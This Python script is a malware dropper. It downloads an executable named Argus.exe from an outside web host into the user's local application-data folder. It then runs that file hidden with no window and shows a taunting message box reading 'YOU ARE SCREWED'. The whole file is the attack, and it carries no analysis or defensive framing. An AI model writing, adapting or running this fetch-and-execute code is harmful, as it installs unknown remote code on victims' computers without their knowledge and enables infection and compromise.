import os
import shutil
import subprocess
import urllib.request
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

URL = "https://darkglitch.vercel.app/argus/Argus.exe"

def main():
    root = tk.Tk()
    root.withdraw()

    argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
    argus_dir.mkdir(parents=True, exist_ok=True)

    destination_exe = argus_dir / "Argus.exe"

    try:
        urllib.request.urlretrieve(URL, destination_exe)
        if destination_exe.exists():
            messagebox.showwarning("ZHASK", "YOU ARE SCREWED")
            subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            messagebox.showwarning("ZHASK", "YOU ARE NOT SCREWED")
    except Exception as e:
        messagebox.showerror("ZHASK", "YOU ARE NOT SCREWED")

    messagebox.showwarning(f"Copied to: {destination_exe}")

if __name__ == "__main__":
    main()